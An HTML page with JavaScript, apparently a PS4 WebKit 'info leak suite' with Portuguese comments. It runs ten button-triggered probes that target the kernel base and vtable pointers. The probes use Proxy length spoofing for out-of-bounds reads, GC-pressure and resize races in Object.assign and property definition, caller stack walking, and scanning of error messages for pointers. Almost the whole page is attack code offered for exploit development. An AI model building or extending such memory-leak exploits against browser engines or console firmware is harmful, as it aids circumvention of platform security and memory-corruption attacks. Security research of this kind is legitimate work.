<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Deep Info Leak Suite v28000</title>
</head>
<body>

<h1>SUITE V28000: DEEP MEMORY LEAK (JSON TARGETED)</h1>
<p>Target: Kernel Base (0xffffffff82200000) & VTable Pointers</p>
<hr>

<button onclick="leakStringLegacy()">01. String.link() Attribute Confusion (Stack Leak)</button>

<button onclick="leakPropGC()">02. Computed Property Key GC Side-Effect (Heap Pointer)</button>

<button onclick="leakFunctionCaller()">03. Function.caller/arguments Stack Walk Leak</button>

<button onclick="leakObjectAssign()">04. Object.assign Target Resize Race (OOB Read)</button>

<button onclick="leakLastIndexOf()">05. Array.lastIndexOf with Proxy & Resize</button>

<button onclick="leakURIError()">06. decodeURI Malformed Sequence Error Message Leak</button>

<button onclick="leakWeakMap()">07. WeakMap Key Survival (Dangling Pointer Check)</button>

<button onclick="leakXMLSerializer()">08. XMLSerializer Recursive Mutation Leak</button>

<button onclick="leakProtoTransition()">09. __proto__ Transition StructureID Leak</button>

<button onclick="leakNumberToString()">10. Large Number.toString(radix) Buffer Leak</button>

<div id="log" style="background: #0d0d0d; color: #00ff00; border: 1px solid #333; height: 400px; overflow: auto; white-space: pre-wrap; font-family: 'Consolas', monospace; font-size: 11px; padding: 10px;"></div>

<script>
    const LOG = document.getElementById('log');
    
    function log(msg) {
        LOG.innerText += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
        LOG.scrollTop = LOG.scrollHeight;
    }

    function checkPtr(val, source) {
        if (typeof val === 'string' && (val.indexOf('0x') > -1 || val.indexOf('ffff') > -1)) {
            log(`[!!!] STRING POINTER (${source}): ${val}`);
        } else if (typeof val === 'number') {
            // Checa se parece um ponteiro Userland (pequeno) ou Kernel (negativo/grande)
            if (val > 0x100000 || val < -0x10000) {
                log(`[!!!] NUMERIC POINTER (${source}): 0x${val.toString(16)}`);
            }
        }
    }

    // 01. Legacy String Method Leak
    // Alvo: Métodos HTML antigos de String (anchor, link, fontcolor).
    // Eles constroem strings na stack C++. Se passarmos objetos com toString() maliciosos,
    // podemos ler lixo da stack adjacente.
    function leakStringLegacy() {
        const s = "leak";
        const evil = {
            toString: () => {
                // Cria pressão na stack
                const arr = new Uint32Array(100).fill(0xDEADBEEF);
                return "";
            }
        };
        try {
            // Gera <a href="...">leak</a>
            const res = s.link(evil);
            // Verifica se vazou algo no atributo
            if (res.includes("DEAD") || res.length > 100) {
                log("Legacy String Leak: " + res.substring(0, 50) + "...");
            } else {
                log("Legacy String: Safe");
            }
        } catch(e) {}
    }

    // 02. Computed Property Key GC Side-Effect (Heap Pointer)
    // Alvo: Definição de objetos literais.
    // O JSC avalia as chaves. Se o GC rodar no meio, a chave anterior pode ter sido movida ou liberada.
    function leakPropGC() {
        let val = 0;
        const obj = {
            [new String("key")]: 1,
            get [(() => {
                // Força GC massivo durante a definição da chave
                const trash = [];
                for(let i=0; i<5000; i++) trash.push({a:i});
                return "leak";
            })()]() { return 2; }
        };
        
        // Itera para ver se alguma chave virou lixo/ponteiro
        const keys = Reflect.ownKeys(obj);
        keys.forEach(k => {
            if (typeof k !== 'string' || k.length > 10) {
                checkPtr(k, "Prop Key GC");
            }
        });
        log("Prop GC check complete.");
    }

    // 03. Function.caller/arguments Stack Walk Leak
    // Alvo: Stack Walker do WebKit.
    // Tenta acessar 'caller' em modo estrito/não-estrito misturado para confundir o walker
    // e ler o ponteiro do frame de pilha anterior.
    function leakFunctionCaller() {
        function inner() {
            try {
                // caller é proibido em strict mode, mas se a implementação falhar...
                const c = inner.caller;
                if (c) checkPtr(c, "Function.caller");
                
                // arguments.callee também
                const args = arguments.callee;
                checkPtr(args, "arguments.callee");
            } catch(e) {
                // O erro pode conter o endereço da função na stack
                checkPtr(e.message, "Caller Error");
            }
        }
        function outer() { inner(); }
        outer();
    }

    // 04. Object.assign Target Resize Race (OOB Read)
    // Alvo: Object.assign loop interno.
    // Usamos um Proxy no 'source' para deletar propriedades do 'target' durante a cópia.
    function leakObjectAssign() {
        const target = { a: 1, b: 2, c: 3 };
        const source = new Proxy({ a: 10, b: 20 }, {
            ownKeys(t) { return ['a', 'b', 'c']; },
            get(t, p) {
                if (p === 'b') {
                    // Shrink target
                    delete target.b;
                    delete target.c;
                    // Tenta fazer o assign ler memória desalocada do target
                }
                return 0x41414141;
            }
        });
        
        try {
            Object.assign(target, source);
            // Verifica se target tem propriedades fantasma
            log("Assign Result: " + JSON.stringify(target));
        } catch(e) {}
    }

    // 05. Array.lastIndexOf with Proxy & Resize
    // Alvo: Algoritmo de busca reversa em Arrays.
    function leakLastIndexOf() {
        const arr = [1, 2, 3, 4];
        const p = new Proxy(arr, {
            get(t, k) {
                if (k == "length") {
                    // Retorna tamanho maior para ler OOB
                    return 100;
                }
                return t[k];
            }
        });
        
        try {
            // lastIndexOf lê de trás para frente. Se confiar no length do proxy...
            const res = Array.prototype.lastIndexOf.call(p, 4);
            log("LastIndexOf: " + res);
        } catch(e) { log("LastIndexOf safe"); }
    }

    // 06. decodeURI Malformed Sequence Error Message Leak
    // Alvo: Manipulação de strings de erro.
    function leakURIError() {
        try {
            // Sequência UTF-8 inválida que força erro no parser URI
            decodeURI("%E0%A4%A"); 
        } catch(e) {
            // Verifica se a mensagem de erro contém o hex do byte inválido ou endereço
            // ex: "URI malformed at address 0x..."
            if (e.message.includes("0x")) {
                checkPtr(e.message, "URI Error");
            } else {
                log("URI Error message clean.");
            }
        }
    }

    // 07. WeakMap Key Survival (Dangling Pointer Check)
    // Alvo: Garbage Collector.
    // Verifica se conseguimos manter uma referência fraca viva mais tempo que o objeto.
    function leakWeakMap() {
        let key = { id: 1 };
        const wm = new WeakMap();
        wm.set(key, 123);
        
        // Remove referência forte
        const ptr = key; // Mantém ref para teste
        key = null;
        
        // Tenta GC
        const junk = new Array(10000).fill(1);
        
        // Se ainda estiver lá, o GC não coletou (ok).
        // Se conseguirmos acessar propriedades de 'ptr' e der erro de acesso, é UAF.
        if (wm.has(ptr)) {
            log("WeakMap key still alive (Expected).");
        }
    }

    // 08. XMLSerializer Recursive Mutation Leak
    // Alvo: Serializador de árvore DOM.
    function leakXMLSerializer() {
        const xs = new XMLSerializer();
        const root = document.createElement("div");
        
        // Getter que altera o DOM durante a serialização
        Object.defineProperty(root, "id", {
            get: () => {
                root.innerHTML = "<span>changed</span>";
                return "test";
            }
        });
        
        try {
            const s = xs.serializeToString(root);
            // Se o serializador mantiver ponteiros para os filhos antigos...
            if (s.includes("span")) log("XMLSerializer mutated correctly.");
            else log("XMLSerializer: " + s);
        } catch(e) {}
    }

    // 09. __proto__ Transition StructureID Leak
    // Alvo: JSC Structure ID.
    function leakProtoTransition() {
        const o = { a: 1 };
        // Mudança de protótipo altera drasticamente a estrutura do objeto na memória
        const oldProto = o.__proto__;
        o.__proto__ = null;
        
        // Tenta ler propriedade oculta ou padding
        try {
            const leak = o[0]; // Indexed access on non-array
            if (leak !== undefined) checkPtr(leak, "Proto Transition");
            else log("Proto transition safe.");
        } catch(e) {}
    }

    // 10. Large Number.toString(radix) Buffer Leak
    // Alvo: Conversão de número para string com radix exótico (ex: 36).
    // Pode usar buffers estáticos no heap C++.
    function leakNumberToString() {
        // Número que gera string longa
        const num = 1.1e100;
        try {
            const s = num.toString(36);
            // Verifica se há lixo no final da string
            if (s.length > 100 && /[^0-9a-z]/.test(s)) {
                checkPtr(s, "Number toString");
            } else {
                log("Number toString safe.");
            }
        } catch(e) {}
    }

</script>

</body>
</html>
